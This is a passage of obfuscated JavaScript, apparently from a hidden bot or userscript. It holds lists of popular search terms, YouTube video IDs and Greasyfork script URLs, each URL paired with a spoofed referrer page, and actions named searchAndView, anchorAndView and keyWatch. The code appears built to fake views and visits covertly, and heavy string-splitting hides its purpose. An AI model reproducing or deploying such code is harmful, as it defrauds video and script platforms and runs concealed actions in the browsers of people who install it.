'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + V(0x7) + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x22ad + 0x6d9 + -0x297c)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x1840 + 0x45d * 0x5 + -0x3 * -0xd3)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x2 * 0x90b + 0x971 + -0x1b84);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    W(0xf, 'Wmeo') + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    V(0x2) + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    V(0x4) + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    V(0x6) + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    W(0xc, 'Wmeo') + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': V(0x9) + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + V(0x14) + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
